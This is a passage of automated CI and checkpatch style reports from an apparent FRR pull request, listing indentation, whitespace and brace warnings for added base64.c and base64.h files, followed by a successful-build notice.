at the start of a line\n    #108: FILE: /tmp/f1-14533/base64.c:108:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64$\n    \n    WARNING: please, no spaces at the start of a line\n    #113: FILE: /tmp/f1-14533/base64.c:113:\n    +    int nbytesdecoded;$\n    \n    WARNING: Missing a blank line after declarations\n    #114: FILE: /tmp/f1-14533/base64.c:114:\n    +    int nbytesdecoded;\n    +    register const unsigned char *bufin;\n    \n    WARNING: please, no spaces at the start of a line\n    #114: FILE: /tmp/f1-14533/base64.c:114:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #115: FILE: /tmp/f1-14533/base64.c:115:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #117: FILE: /tmp/f1-14533/base64.c:117:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #118: FILE: /tmp/f1-14533/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #118: FILE: /tmp/f1-14533/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #120: FILE: /tmp/f1-14533/base64.c:120:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #121: FILE: /tmp/f1-14533/base64.c:121:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #123: FILE: /tmp/f1-14533/base64.c:123:\n    +    return nbytesdecoded + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #128: FILE: /tmp/f1-14533/base64.c:128:\n    +    int nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #129: FILE: /tmp/f1-14533/base64.c:129:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #130: FILE: /tmp/f1-14533/base64.c:130:\n    +    register unsigned char *bufout;$\n    \n    WARNING: please, no spaces at the start of a line\n    #131: FILE: /tmp/f1-14533/base64.c:131:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #133: FILE: /tmp/f1-14533/base64.c:133:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #134: FILE: /tmp/f1-14533/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #134: FILE: /tmp/f1-14533/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #135: FILE: /tmp/f1-14533/base64.c:135:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #136: FILE: /tmp/f1-14533/base64.c:136:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #138: FILE: /tmp/f1-14533/base64.c:138:\n    +    bufout = (unsigned char *) bufplain;$\n    \n    WARNING: please, no spaces at the start of a line\n    #139: FILE: /tmp/f1-14533/base64.c:139:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #141: FILE: /tmp/f1-14533/base64.c:141:\n    +    while (nprbytes > 4) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #141: FILE: /tmp/f1-14533/base64.c:141:\n    +    while (nprbytes > 4) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #142: FILE: /tmp/f1-14533/base64.c:142:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #143: FILE: /tmp/f1-14533/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #143: FILE: /tmp/f1-14533/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #144: FILE: /tmp/f1-14533/base64.c:144:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #145: FILE: /tmp/f1-14533/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #145: FILE: /tmp/f1-14533/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #146: FILE: /tmp/f1-14533/base64.c:146:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #147: FILE: /tmp/f1-14533/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #147: FILE: /tmp/f1-14533/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #148: FILE: /tmp/f1-14533/base64.c:148:\n    +    bufin += 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #149: FILE: /tmp/f1-14533/base64.c:149:\n    +    nprbytes -= 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #150: FILE: /tmp/f1-14533/base64.c:150:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #153: FILE: /tmp/f1-14533/base64.c:153:\n    +    if (nprbytes > 1) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #153: FILE: /tmp/f1-14533/base64.c:153:\n    +    if (nprbytes > 1) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #154: FILE: /tmp/f1-14533/base64.c:154:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #155: FILE: /tmp/f1-14533/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #155: FILE: /tmp/f1-14533/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #156: FILE: /tmp/f1-14533/base64.c:156:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #157: FILE: /tmp/f1-14533/base64.c:157:\n    +    if (nprbytes > 2) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #157: FILE: /tmp/f1-14533/base64.c:157:\n    +    if (nprbytes > 2) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #158: FILE: /tmp/f1-14533/base64.c:158:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #159: FILE: /tmp/f1-14533/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #159: FILE: /tmp/f1-14533/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #160: FILE: /tmp/f1-14533/base64.c:160:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #161: FILE: /tmp/f1-14533/base64.c:161:\n    +    if (nprbytes > 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #161: FILE: /tmp/f1-14533/base64.c:161:\n    +    if (nprbytes > 3) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #162: FILE: /tmp/f1-14533/base64.c:162:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #163: FILE: /tmp/f1-14533/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #163: FILE: /tmp/f1-14533/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #164: FILE: /tmp/f1-14533/base64.c:164:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #166: FILE: /tmp/f1-14533/base64.c:166:\n    +    *(bufout++) = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #167: FILE: /tmp/f1-14533/base64.c:167:\n    +    nbytesdecoded -= (4 - nprbytes) & 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #168: FILE: /tmp/f1-14533/base64.c:168:\n    +    return nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #172: FILE: /tmp/f1-14533/base64.c:172:\n    +    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";$\n    \n    WARNING: please, no spaces at the start of a line\n    #176: FILE: /tmp/f1-14533/base64.c:176:\n    +    return ((len + 2) / 3 * 4) + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #181: FILE: /tmp/f1-14533/base64.c:181:\n    +    int i;$\n    \n    WARNING: please, no spaces at the start of a line\n    #182: FILE: /tmp/f1-14533/base64.c:182:\n    +    char *p;$\n    \n    WARNING: please, no spaces at the start of a line\n    #184: FILE: /tmp/f1-14533/base64.c:184:\n    +    p = encoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #185: FILE: /tmp/f1-14533/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #185: FILE: /tmp/f1-14533/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #186: FILE: /tmp/f1-14533/base64.c:186:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #187: FILE: /tmp/f1-14533/base64.c:187:\n    +    *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #188: FILE: /tmp/f1-14533/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #188: FILE: /tmp/f1-14533/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #189: FILE: /tmp/f1-14533/base64.c:189:\n    +    *p++ = basis_64[((string[i + 1] & 0xF) << 2) |$\n    \n    ERROR: code indent should use tabs where possible\n    #190: FILE: /tmp/f1-14533/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #190: FILE: /tmp/f1-14533/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #191: FILE: /tmp/f1-14533/base64.c:191:\n    +    *p++ = basis_64[string[i + 2] & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #192: FILE: /tmp/f1-14533/base64.c:192:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #193: FILE: /tmp/f1-14533/base64.c:193:\n    +    if (i < len) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #193: FILE: /tmp/f1-14533/base64.c:193:\n    +    if (i < len) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #194: FILE: /tmp/f1-14533/base64.c:194:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #195: FILE: /tmp/f1-14533/base64.c:195:\n    +    if (i == (len - 1)) {$\n    \n    ERROR: code indent should use tabs where possible\n    #196: FILE: /tmp/f1-14533/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #196: FILE: /tmp/f1-14533/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #197: FILE: /tmp/f1-14533/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #197: FILE: /tmp/f1-14533/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #198: FILE: /tmp/f1-14533/base64.c:198:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #199: FILE: /tmp/f1-14533/base64.c:199:\n    +    else {$\n    \n    ERROR: else should follow close brace '}'\n    #199: FILE: /tmp/f1-14533/base64.c:199:\n    +    }\n    +    else {\n    \n    ERROR: code indent should use tabs where possible\n    #200: FILE: /tmp/f1-14533/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    WARNING: please, no spaces at the start of a line\n    #200: FILE: /tmp/f1-14533/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #201: FILE: /tmp/f1-14533/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #201: FILE: /tmp/f1-14533/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #202: FILE: /tmp/f1-14533/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #202: FILE: /tmp/f1-14533/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #203: FILE: /tmp/f1-14533/base64.c:203:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #204: FILE: /tmp/f1-14533/base64.c:204:\n    +    *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #205: FILE: /tmp/f1-14533/base64.c:205:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #207: FILE: /tmp/f1-14533/base64.c:207:\n    +    *p++ = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #208: FILE: /tmp/f1-14533/base64.c:208:\n    +    return p - encoded;$\n    Report for base64.h | 35 issues\n    ===============================================\n    WARNING: Block comments should align the * on each line\n    #2: FILE: /tmp/f1-14533/base64.h:2:\n    +/*\n    +* Copyright (c) 2003 Apple Computer, Inc. All rights reserved.\n    \n    WARNING: Block comments should align the * on each line\n    #26: FILE: /tmp/f1-14533/base64.h:26:\n    +/* ====================================================================\n    +* Copyright (c) 1995-1999 The Apache Group.  All rights reserved.\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #92: FILE: /tmp/f1-14533/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #92: FILE: /tmp/f1-14533/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n                                                             ^\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #94: FILE: /tmp/f1-14533/base64.h:94:\n    +int Base64decode_len(const char * coded_src);\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #95: FILE: /tmp/f1-14533/base64.h:95:\n    +int Base64decode(char * plain_dst, const char *coded_src);\n    \n    WARNING: adding a line without newline at end of file\n    #101: FILE: /tmp/f1-14533/base64.h:101:\n    +#endif //_BASE64_H_\n    \n    WARNING: C99 // comments do not match recommendation\n    #101: FILE: /tmp/f1-14533/base64.h:101:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 6 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-14533/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #690: FILE: /tmp/f1-14533/yang_wrappers.c:690:\n    < WARNING: Missing a blank line after declarations\n    < #701: FILE: /tmp/f1-14533/yang_wrappers.c:701:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3386/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    <stdin>:87: trailing whitespace.\n     * \n    <stdin>:89: trailing whitespace.\n     * \n    <stdin>:96: trailing whitespace.\n     * \n    <stdin>:104: trailing whitespace.\n     * \n    warning: 4 lines add whitespace errors.\n    Report for base64.c | 213 issues\n    ===============================================\n    ERROR: trailing whitespace\n    #5: FILE: /tmp/f1-24185/base64.c:5:\n    + * $\n    \n    ERROR: trailing whitespace\n    #7: FILE: /tmp/f1-24185/base64.c:7:\n    + * $\n    \n    ERROR: trailing whitespace\n    #14: FILE: /tmp/f1-24185/base64.c:14:\n    + * $\n    \n    ERROR: trailing whitespace\n    #22: FILE: /tmp/f1-24185/base64.c:22:\n    + * $\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-24185/base64.c:91:\n    +static const unsigned char pr2six[256] =\n    +{\n    \n    WARNING: please, no spaces at the start of a line\n    #93: FILE: /tmp/f1-24185/base64.c:93:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #94: FILE: /tmp/f1-24185/base64.c:94:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #95: FILE: /tmp/f1-24185/base64.c:95:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,$\n    \n    WARNING: please, no spaces at the start of a line\n    #96: FILE: /tmp/f1-24185/base64.c:96:\n    +    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #97: FILE: /tmp/f1-24185/base64.c:97:\n    +    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,$\n    \n    WARNING: please, no spaces at the start of a line\n    #98: FILE: /tmp/f1-24185/base64.c:98:\n    +    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #99: FILE: /tmp/f1-24185/base64.c:99:\n    +    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,$\n    \n    WARNING: please, no spaces at the start of a line\n    #100: FILE: /tmp/f1-24185/base64.c:100:\n    +    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #101: FILE: /tmp/f1-24185/base64.c:101:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #102: FILE: /tmp/f1-24185/base64.c:102:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #103: FILE: /tmp/f1-24185/base64.c:103:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #104: FILE: /tmp/f1-24185/base64.c:104:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #105: FILE: /tmp/f1-24185/base64.c:105:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #106: FILE: /tmp/f1-24185/base64.c:106:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #107: FILE: /tmp/f1-24185/base64.c:107:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #108: FILE: /tmp/f1-24185/base64.c:108:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64$\n    \n    WARNING: please, no spaces at the start of a line\n    #113: FILE: /tmp/f1-24185/base64.c:113:\n    +    int nbytesdecoded;$\n    \n    WARNING: Missing a blank line after declarations\n    #114: FILE: /tmp/f1-24185/base64.c:114:\n    +    int nbytesdecoded;\n    +    register const unsigned char *bufin;\n    \n    WARNING: please, no spaces at the start of a line\n    #114: FILE: /tmp/f1-24185/base64.c:114:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #115: FILE: /tmp/f1-24185/base64.c:115:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #117: FILE: /tmp/f1-24185/base64.c:117:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #118: FILE: /tmp/f1-24185/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #118: FILE: /tmp/f1-24185/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #120: FILE: /tmp/f1-24185/base64.c:120:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #121: FILE: /tmp/f1-24185/base64.c:121:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #123: FILE: /tmp/f1-24185/base64.c:123:\n    +    return nbytesdecoded + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #128: FILE: /tmp/f1-24185/base64.c:128:\n    +    int nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #129: FILE: /tmp/f1-24185/base64.c:129:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #130: FILE: /tmp/f1-24185/base64.c:130:\n    +    register unsigned char *bufout;$\n    \n    WARNING: please, no spaces at the start of a line\n    #131: FILE: /tmp/f1-24185/base64.c:131:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #133: FILE: /tmp/f1-24185/base64.c:133:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #134: FILE: /tmp/f1-24185/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #134: FILE: /tmp/f1-24185/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #135: FILE: /tmp/f1-24185/base64.c:135:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #136: FILE: /tmp/f1-24185/base64.c:136:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #138: FILE: /tmp/f1-24185/base64.c:138:\n    +    bufout = (unsigned char *) bufplain;$\n    \n    WARNING: please, no spaces at the start of a line\n    #139: FILE: /tmp/f1-24185/base64.c:139:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #141: FILE: /tmp/f1-24185/base64.c:141:\n    +    while (nprbytes > 4) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #141: FILE: /tmp/f1-24185/base64.c:141:\n    +    while (nprbytes > 4) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #142: FILE: /tmp/f1-24185/base64.c:142:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #143: FILE: /tmp/f1-24185/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #143: FILE: /tmp/f1-24185/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #144: FILE: /tmp/f1-24185/base64.c:144:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #145: FILE: /tmp/f1-24185/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #145: FILE: /tmp/f1-24185/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #146: FILE: /tmp/f1-24185/base64.c:146:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #147: FILE: /tmp/f1-24185/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #147: FILE: /tmp/f1-24185/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #148: FILE: /tmp/f1-24185/base64.c:148:\n    +    bufin += 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #149: FILE: /tmp/f1-24185/base64.c:149:\n    +    nprbytes -= 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #150: FILE: /tmp/f1-24185/base64.c:150:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #153: FILE: /tmp/f1-24185/base64.c:153:\n    +    if (nprbytes > 1) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #153: FILE: /tmp/f1-24185/base64.c:153:\n    +    if (nprbytes > 1) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #154: FILE: /tmp/f1-24185/base64.c:154:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #155: FILE: /tmp/f1-24185/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #155: FILE: /tmp/f1-24185/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #156: FILE: /tmp/f1-24185/base64.c:156:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #157: FILE: /tmp/f1-24185/base64.c:157:\n    +    if (nprbytes > 2) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #157: FILE: /tmp/f1-24185/base64.c:157:\n    +    if (nprbytes > 2) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #158: FILE: /tmp/f1-24185/base64.c:158:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #159: FILE: /tmp/f1-24185/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #159: FILE: /tmp/f1-24185/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #160: FILE: /tmp/f1-24185/base64.c:160:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #161: FILE: /tmp/f1-24185/base64.c:161:\n    +    if (nprbytes > 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #161: FILE: /tmp/f1-24185/base64.c:161:\n    +    if (nprbytes > 3) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #162: FILE: /tmp/f1-24185/base64.c:162:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #163: FILE: /tmp/f1-24185/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #163: FILE: /tmp/f1-24185/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #164: FILE: /tmp/f1-24185/base64.c:164:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #166: FILE: /tmp/f1-24185/base64.c:166:\n    +    *(bufout++) = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #167: FILE: /tmp/f1-24185/base64.c:167:\n    +    nbytesdecoded -= (4 - nprbytes) & 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #168: FILE: /tmp/f1-24185/base64.c:168:\n    +    return nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #172: FILE: /tmp/f1-24185/base64.c:172:\n    +    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";$\n    \n    WARNING: please, no spaces at the start 